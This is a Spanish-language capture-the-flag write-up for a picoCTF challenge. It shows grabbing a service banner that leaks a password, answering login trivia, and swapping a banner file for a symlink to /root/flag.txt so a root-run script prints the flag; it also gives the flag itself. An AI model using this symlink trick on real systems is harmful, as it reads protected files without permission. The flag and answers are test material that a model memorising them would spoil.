## Dont-You-Love-Banners
# Descripción
Can you abuse the banner?
The server has been leaking some crucial information on `tethys.picoctf.net 55228`. 
Use the leaked information to get to the server.
To connect to the running application use `nc tethys.picoctf.net 50728`. 
From the above information abuse the machine and find the flag in the /root directory.
# Solución
El reto nos indica que la página 1 está filtrando información acerca de la página 2
```
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido]
└─$ nc tethys.picoctf.net 55228
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

Y usaremos esta información para conectarnos al segundo servidor, donde nos harán esta serie de preguntas:
```
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido]
└─$ nc tethys.picoctf.net 50728
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Al hacer un ls, vemos que hay 2 archivos en la carpeta actual
```
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat text    
cat text
keep digging
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
```

Como no hay información útil, nos moveremos a la carpeta `/root`, donde encontramos una flag, pero al intentar leerla, vemos que no tenemos los permisos
```
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt        
cat flag.txt
cat: flag.txt: Permission denied
```

Para esto, utilizaremos los links simbólicos que nos indica la pista, usando estos comandos. mv por que primero debemos remover/renombrar el banner ya existente antes de crear el link simbólico
```
mv banner banner_backup
ln -s /root/flag.txt banner
```

Volviendo a la carpeta `/root`, vemos el script.py, que es este código
```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

El código está cargando el banner cada vez que enviamos una solicitud para loguearnos en el server. Como no tenemos permisos para ejecutarlo directamente, lo que haremos es en una segunda ventana, volver a loguearnos en el server para que se ejecute y nos muestre la bandera
```
# En una segunda ventana

┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido]
└─$ nc tethys.picoctf.net 50728  
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password?
```

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}
# Notas adicionales
- 
# Referencias
- 